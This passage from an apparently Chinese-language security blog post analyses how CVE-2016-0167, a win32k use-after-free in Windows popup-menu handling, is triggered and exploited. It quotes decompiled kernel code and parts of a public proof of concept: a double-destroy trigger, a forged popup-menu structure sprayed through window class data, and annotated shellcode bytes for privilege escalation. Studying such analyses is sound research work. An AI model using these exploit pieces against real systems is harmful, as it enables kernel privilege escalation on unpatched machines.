<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">void __stdcall xxxMNEndMenuState(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  PSINGLE_LIST_ENTRY v1; &#x2F;&#x2F; edi</span><br><span class="line">  _SINGLE_LIST_ENTRY *v2; &#x2F;&#x2F; esi</span><br><span class="line">  _SINGLE_LIST_ENTRY *v3; &#x2F;&#x2F; eax</span><br><span class="line"></span><br><span class="line">  v1 &#x3D; gptiCurrent;</span><br><span class="line">  v2 &#x3D; gptiCurrent[65].Next;</span><br><span class="line">  if ( !v2[7].Next )</span><br><span class="line">  &#123;</span><br><span class="line">    MNEndMenuStateNotify(gptiCurrent[65].Next);</span><br><span class="line">    if ( v2-&gt;Next )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( a1 )</span><br><span class="line">        MNFreePopup((_tagPOPUPMENU *)v2-&gt;Next);</span><br><span class="line">      else</span><br><span class="line">        v2-&gt;Next-&gt;Next &#x3D; (_SINGLE_LIST_ENTRY *)((_DWORD)v2-&gt;Next-&gt;Next &amp; 0xFFFEFFFF);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>​    这时系统会进行hook函数中自定义的消息WM_EX_TRIGGER的处理，进而进入自定义的消息处理函数xxMainWindowProc中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">static</span><br><span class="line">LRESULT</span><br><span class="line">WINAPI</span><br><span class="line">xxMainWindowProc(</span><br><span class="line">    _In_ HWND   hwnd,</span><br><span class="line">    _In_ UINT   msg,</span><br><span class="line">    _In_ WPARAM wParam,</span><br><span class="line">    _In_ LPARAM lParam</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">    if (msg &#x3D;&#x3D; WM_EX_TRIGGER)</span><br><span class="line">    &#123;</span><br><span class="line">        DWORD_PTR popupMenuDest &#x3D; 0;</span><br><span class="line">        popupMenuDest &#x3D; *(DWORD_PTR*)((PBYTE)xxHMValidateHandle(hwndMenuDest) + 0xb0);</span><br><span class="line">        DestroyWindow(hwndMenuDest);</span><br><span class="line">        LRESULT Triggered &#x3D; SendMessageW(hWindowHunt, 0x9F9F, popupMenuDest, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    return DefWindowProcW(hwnd, msg, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>xxMainWindowProc调用DestroyWindow并最终调用xxxMNDestroyHandler销毁目标窗口，xxxMNDestroyHandler在处理WM_UNINITMENUPOPUP消息时会将关联窗口对象句柄作为参数传入，这将命中xxWindowHookProc中处理消息为WM_UNINITMENUPOPUP且spmenu为cwp-&gt;wParam的条件执行DestroyWindow(hwndMenuDest)，这会导致针对相同hwndMenuDest对象第二次执行xxxMNDestroyHandler，第二次执行xxxMNDestroyHandler时会执行同样的流程但是由于自定义的标志位bEnterUninit已经改变，所以不会第三次执行DestroyWindow。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">if (cwp-&gt;message &#x3D;&#x3D; WM_UNINITMENUPOPUP &amp;&amp;</span><br><span class="line">    bEnterUninit &#x3D;&#x3D; FALSE &amp;&amp;</span><br><span class="line">    hMenuList[1] &#x3D;&#x3D; (HMENU)cwp-&gt;wParam)</span><br><span class="line">&#123;</span><br><span class="line">    bEnterUninit &#x3D; TRUE;</span><br><span class="line">    DestroyWindow(hwndMenuDest);</span><br><span class="line">    DWORD dwPopupFake[0xD] &#x3D; &#123; 0 &#125;;</span><br><span class="line">    dwPopupFake[0x0] &#x3D; (DWORD)0x00088208;  &#x2F;&#x2F;-&gt;flags</span><br><span class="line">    dwPopupFake[0x1] &#x3D; (DWORD)pvHeadFake;  &#x2F;&#x2F;-&gt;spwndNotify</span><br><span class="line">    dwPopupFake[0x2] &#x3D; (DWORD)pvHeadFake;  &#x2F;&#x2F;-&gt;spwndPopupMenu</span><br><span class="line">    dwPopupFake[0x3] &#x3D; (DWORD)pvHeadFake;  &#x2F;&#x2F;-&gt;spwndNextPopup</span><br><span class="line">    dwPopupFake[0x4] &#x3D; (DWORD)pvAddrFlags - 4; &#x2F;&#x2F;-&gt;spwndPrevPopup</span><br><span class="line">    dwPopupFake[0x5] &#x3D; (DWORD)pvHeadFake;  &#x2F;&#x2F;-&gt;spmenu</span><br><span class="line">    dwPopupFake[0x6] &#x3D; (DWORD)pvHeadFake;  &#x2F;&#x2F;-&gt;spmenuAlternate</span><br><span class="line">    dwPopupFake[0x7] &#x3D; (DWORD)pvHeadFake;  &#x2F;&#x2F;-&gt;spwndActivePopup</span><br><span class="line">    dwPopupFake[0x8] &#x3D; (DWORD)0xFFFFFFFF;  &#x2F;&#x2F;-&gt;ppopupmenuRoot</span><br><span class="line">    dwPopupFake[0x9] &#x3D; (DWORD)pvHeadFake;  &#x2F;&#x2F;-&gt;ppmDelayedFree</span><br><span class="line">    dwPopupFake[0xA] &#x3D; (DWORD)0xFFFFFFFF;  &#x2F;&#x2F;-&gt;posSelectedItem</span><br><span class="line">    dwPopupFake[0xB] &#x3D; (DWORD)pvHeadFake;  &#x2F;&#x2F;-&gt;posDropped</span><br><span class="line">    dwPopupFake[0xC] &#x3D; (DWORD)0;</span><br><span class="line">    for (UINT i &#x3D; 0; i &lt; iWindowCount; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        SetClassLongW(hWindowList[i], GCL_MENUNAME, (LONG)dwPopupFake);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    由于此时子弹出菜单fDelayedFree标志位未被置位，将会马上执行MNFreePopop释放掉。（若此时只进行DestroyWindow没有之后的伪造会返回到第一次xxxMNCancel最终调用xxxMNDestroyHandler时会执行相同的操作进而构成double free。）而在实际poc中对xxTrackExploitEx中批量创建的hWindowList[]窗口对象的GCL_MENUNAME进行了伪造。执行完DestroyWindow返回到xxMainWindowProc中继续执行调用SendMessageW发送一个消息0x9F9F并最终触发提权操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x3d, 0x9f, 0x9f, 0x00, 0x00,       &#x2F;&#x2F; cmp     eax,9F9Fh</span><br><span class="line">0x0f, 0x85, 0x8d, 0x00, 0x00, 0x00, &#x2F;&#x2F; jne     Loader+0x1128</span><br><span class="line">&#x2F;&#x2F; Loader+0x109b:</span><br><span class="line">&#x2F;&#x2F; Judge if CS is 0x1b, which means in user-mode context.</span><br><span class="line">0x66, 0x8c, 0xc8,                   &#x2F;&#x2F; mov     ax,cs</span><br><span class="line">0x66, 0x83, 0xf8, 0x1b,             &#x2F;&#x2F; cmp     ax,1Bh</span><br><span class="line">0x0f, 0x84, 0x80, 0x00, 0x00, 0x00, &#x2F;&#x2F; je      Loader+0x1128</span><br><span class="line">&#x2F;&#x2F; Loader+0x10a8:</span><br><span class="line">&#x2F;&#x2F; Get the address of pwndWindowHunt to ECX.</span><br><span class="line">&#x2F;&#x2F; Recover the flags of pwndWindowHunt: zero bServerSideWindowProc.</span><br><span class="line">&#x2F;&#x2F; Get the address of pvShellCode to EDX by CALL-POP.</span><br><span class="line">&#x2F;&#x2F; Get the address of pvShellCode-&gt;tagCLS[0x100] to ESI.</span><br><span class="line">&#x2F;&#x2F; Get the address of popupMenuDest to EDI.</span><br><span class="line">0xfc,                               &#x2F;&#x2F; cld</span><br><span class="line">0x8b, 0x4d, 0x08,                   &#x2F;&#x2F; mov     ecx,dword ptr [ebp+8]</span><br><span class="line">0xff, 0x41, 0x16,                   &#x2F;&#x2F; inc     dword ptr [ecx+16h]</span><br><span class="line">0x60,                               &#x2F;&#x2F; pushad</span><br><span class="line">0xe8, 0x00, 0x00, 0x00, 0x00,       &#x2F;&#x2F; call    $5</span><br></pre></td></tr></table></figure>

<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>​    这篇文章主要分析了cve-2016-0167的触发逻辑和漏洞利用思路，其中poc的作者leeqwind利用同步和异步消息构造满足漏洞触发条件的子弹出菜单对象的过程比较巧妙，可以多多调试加以体会。</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a target="_blank" rel="noopener" href="https://xiaodaozhi.com/exploit/135.html">https://xiaodaozhi.com/exploit/135.html</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/leeqwind/HolicPOC/blob/master/windows/win32k/CVE-2016-0167/x86.cpp">https://github.com/leeqwind/HolicPOC/blob/master/windows/win32k/CVE-2016-0167/x86.cpp</a></p>
<p><a target="_blank" rel="noopener" href="http://media.blackhat.com/bh-us-11/Mandt/BH_US_11_Mandt_win32k_WP.pdf">http://media.blackhat.com/bh-us-11/Mandt/BH_US_11_Mandt_win32k_WP.pdf</a></p>
</div></div><div class="post-main post-comment"></div></article><link rel="stylesheet" type="text/css" href="/css/font.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.css"><script src="//cdn.bootcss.com/jquery/2.0.3/jquery.min.js"></script><script src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script>$(document).ready(function() {
  $(".fancybox").fancybox();
});
</script></body></html>